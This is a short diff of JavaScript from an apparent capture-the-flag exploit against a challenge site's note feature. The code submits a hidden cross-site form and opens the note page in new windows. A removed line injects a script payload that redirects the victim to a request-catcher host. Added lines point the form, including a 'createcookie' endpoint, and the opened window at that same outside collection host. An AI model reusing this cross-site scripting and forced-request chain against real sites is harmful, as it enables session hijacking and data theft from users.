@@ -18,13 +18,13 @@
 
       var form = document.createElement("form");
       form.target = uniqueString;
-      form.action = "https://tbdxss.chal.perfect.blue/change_note";
+      form.action = "https://helloworlsdfaklfjklsfd.requestcatcher.com/createcookie";
       form.method = "POST";
 
       var input = document.createElement("input");
       input.type = "hidden";
       input.name = "data";
-      input.value = '<script>window.location="https://helloworlsdfaklfjklsfd.requestcatcher.com/xssworke" ';
+      input.value ="Something" ;
       form.appendChild(input);
 
       document.body.appendChild(form);
@@ -37,7 +37,7 @@
     setTimeout(function () {
       user.location = 'https://tbdxss.chal.perfect.blue/note' // loads a ifrane with notes 
       setTimeout(function () {
-        window.open('https://tbdxss.chal.perfect.blue/note'); // open the window with xss we se before ( note )
+        window.open('https://helloworlsdfaklfjklsfd.requestcatcher.com/notes'); // open the window with xss we se before ( note )
 
       }, 2000);
 
